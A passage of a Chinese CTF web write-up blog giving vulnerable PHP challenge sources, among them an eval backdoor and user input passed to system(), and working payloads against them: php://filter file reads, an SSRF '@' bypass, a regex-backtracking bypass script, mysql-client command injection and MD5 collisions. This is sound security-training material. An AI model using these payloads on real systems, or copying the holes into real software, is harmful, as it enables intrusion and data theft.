class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><h1 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$J1ng</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br><span class="hljs-variable">$Hong</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>];<br><span class="hljs-variable">$Keng</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;K&#x27;</span>];<br><span class="hljs-variable">$Wang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;W&#x27;</span>];<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Keng</span>(<span class="hljs-variable">$Wang</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$J1ng</span>(<span class="hljs-variable">$Hong</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span><br>?K=GlobIterator<span class="hljs-variable">&amp;</span>W=glob:<span class="hljs-comment">///secret/*</span><br><span class="hljs-symbol">POST:</span><br>J=SplFileObject<span class="hljs-variable">&amp;</span>H=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=/secret/f11444g.php</span><br></code></pre></td></tr></table></figure><p><a href="https://www.qwesec.com/2023/10/phpBuilt-inClasses.html">CTF中PHP原生类的妙用</a></p><h1 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Aura 酱，欢迎回家~</span><br><span class="hljs-comment">// 这里有一份礼物，请你签收一下哟~</span><br><span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pen&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">&#x27;Aura&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><br><span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不是 Aura 的博客！&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="hljs-literal">false</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;请去博客里面写下感想哦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><br><span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gift&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>); <br></code></pre></td></tr></table></figure><p>首先对于第一个判断, 他需要读取一个文件后内容是 <code>Aura</code>,我们可以尝试通过 <code>data://</code> 伪协议来进行读取</p><p>在文件读取的情况下, 利用 <code>data://</code> 伪协议:</p><ul><li><code>data://text/plain,一串内容</code> 可以读取出 <code>一串内容</code></li><li><code>data://text/plain;base64,xxxxxxxx</code> 其中 <code>xxxxxxx</code> 会被 Base64 解码后再读取出内容</li></ul><p>所以我们此处可以使用:</p><ul><li><code>data://text/plain,Aura</code></li><li><code>data://text/plain;base64,QXVyYQ==</code></li></ul><p>第二个判断的话, 我们要求页面的开头为 <code>http://jasmineaura.github.io</code></p><p>我们可以利用 <code>@</code> 来进行隔断, 将 <code>@</code> 前面的内容当做用户名 (参考 <a href="https://cloud.tencent.com/developer/article/2288231">https://cloud.tencent.com/developer/article/2288231</a>)</p><p class="note note-primary">URL 的格式为 `scheme://user:password@address:port/path?query#fragment`</p><p>而我们需要页面的内容存在这个字符串, 我们可以就利用当前页面来显示, 于是构造</p><p><code>http://jasmineaura.github.io@127.0.0.1</code></p><p>第三个的话是一个 include 点, 由于我们的 flag 在注释部分, 我们需要将其伪协议和过滤器来进行 base64 编码后输出</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://www.cnblogs.com/ya7q/p/19045966">SSRF学习</a></p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)</a></p><h1 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我记得她...好像叫flag.php吧？</span><br><span class="hljs-variable">$emp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e_m.p&#x27;</span>];<br><span class="hljs-variable">$try</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;try&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$emp</span>!=<span class="hljs-string">&quot;114514&quot;</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$emp</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">114514</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$emp</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$emp</span>[<span class="hljs-variable">$i</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你不是hacker？那请去外场等候！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="hljs-variable">$try</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你是hacker还敢自报家门呢？&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$try</span>,<span class="hljs-string">&#x27;HACKER&#x27;</span>) === <span class="hljs-literal">TRUE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;114514到底是啥意思嘞？。？&quot;</span>);<br>&#125;<br><span class="hljs-comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里e_m.p有特殊字符和.所以要将换成[</p><p>因为.+?是匹配一个或多个任意字符,至少需要一个字符,所以必须让HACKER出现在try的参数中，但不是在开头</p><blockquote><ul><li><code>.+?</code> 是「非贪婪匹配」，本意是匹配「任意最少字符」后接 <code>HACKER</code>；</li><li>但当 <code>HACKER</code> 出现在<strong>极长字符串的末尾</strong>（比如 100 万 + 个 <code>-</code> 之后），正则引擎会陷入「无限回溯」：<ol><li>非贪婪的 <code>.+?</code> 先匹配 1 个 <code>-</code>，检查后面是否是 <code>HACKER</code> → 不是；</li><li>匹配 2 个 <code>-</code>，检查后面 → 不是；</li><li>重复这个过程，直到匹配 1000001 个 <code>-</code> 后，才找到末尾的 <code>HACKER</code>；</li><li>PHP 对正则回溯有<strong>内存 &#x2F; 时间限制</strong>（默认配置下，超过一定回溯次数会直接返回 <code>false</code>），导致 <code>preg_match</code> 执行超时 &#x2F; 内存溢出，最终返回 <code>false</code>，第一段检测被绕过。</li></ol></li></ul></blockquote><p>代码 <code>(new $a($b))-&gt;$c()</code>动态实例化类 <code>$a</code>（参数为 <code>$b</code>），并调用方法 <code>$c()</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>res = requests.post(<span class="hljs-string">&quot;http://101.37.149.223:32943/index.php?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&quot;</span>,data = &#123;<span class="hljs-string">&quot;try&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>*<span class="hljs-number">1000001</span>+<span class="hljs-string">&quot;HACKER&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><blockquote><p>requests.post语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;response = requests.post(<br> url,        <span class="hljs-comment"># 必传：请求的URL地址</span><br> data=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># 可选：表单格式的请求体（dict/字符串/字节）</span><br>    json=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># 可选：JSON格式的请求体（dict，自动序列化+设置Content-Type: application/json）</span><br>    headers=<span class="hljs-literal">None</span>, <span class="hljs-comment"># 可选：请求头（dict）</span><br>    params=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># 可选：URL中的GET参数（dict）</span><br>    files=<span class="hljs-literal">None</span>,   <span class="hljs-comment"># 可选：文件上传（dict）</span><br>    timeout=<span class="hljs-literal">None</span>, <span class="hljs-comment"># 可选：超时时间（秒，防止请求挂起）</span><br>    verify=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># 可选：是否验证SSL证书（False忽略证书错误）</span><br>    cookies=<span class="hljs-literal">None</span>  <span class="hljs-comment"># 可选：请求携带的Cookie（dict）</span><br>   )<br></code></pre></td></tr></table></figure></blockquote><h1 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h1><p>打开容器，题目已经给出环境源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/se|ec|;|@|del|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>);<br></code></pre></td></tr></table></figure><p>和only one sql那道题比较相似，多禁用了一些参数，sql注入基本没可能了</p><p>题目hint1给出要RCE，hint2给出mysql远程连接和命令行操作有区别，hint3给出输个问号看看</p><p>题目是一个比较冷门的考点，mysql命令行程序的命令执行，常见于mysql有suid时的提权</p><p>hint3中提示输个问号看看，那么就在mysql命令行中输入个问号试试，如下</p><p>其中注意到一行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">system</span>    (\<span class="hljs-operator">!</span>) <span class="hljs-keyword">Execute</span> a <span class="hljs-keyword">system</span> shell command.<br></code></pre></td></tr></table></figure><p>意思是使用system关键字或!可以直接通过mysql命令行执行一个system shell命令，尝试一下如下图所示</p><p>那么问题就简单了，使用换行符绕过注释的限制，使用system执行命令，env可以直接出flag，想要弹shell需要用bash -c “command”包裹一下也可以弹出</p><h1 id="所以你说你懂-MD5"><a href="#所以你说你懂-MD5" class="headerlink" title="所以你说你懂 MD5?"></a>所以你说你懂 MD5?</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 所以你说你懂 MD5 了?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;加强难度就不会了?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 什么? 你绕过去了?</span><br><span class="hljs-comment">// 加大剂量!</span><br><span class="hljs-comment">// 我要让他成为 string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;难吗?不难!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你还是绕过去了?</span><br><span class="hljs-comment">// 哦哦哦, 我少了一个等于号</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你以为这就结束了</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// 你想看到 random 的值吗?</span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5</span><br><span class="hljs-comment">// 那 flag 就给你吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>第三层强碰撞绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">apppple<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;banananana<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span 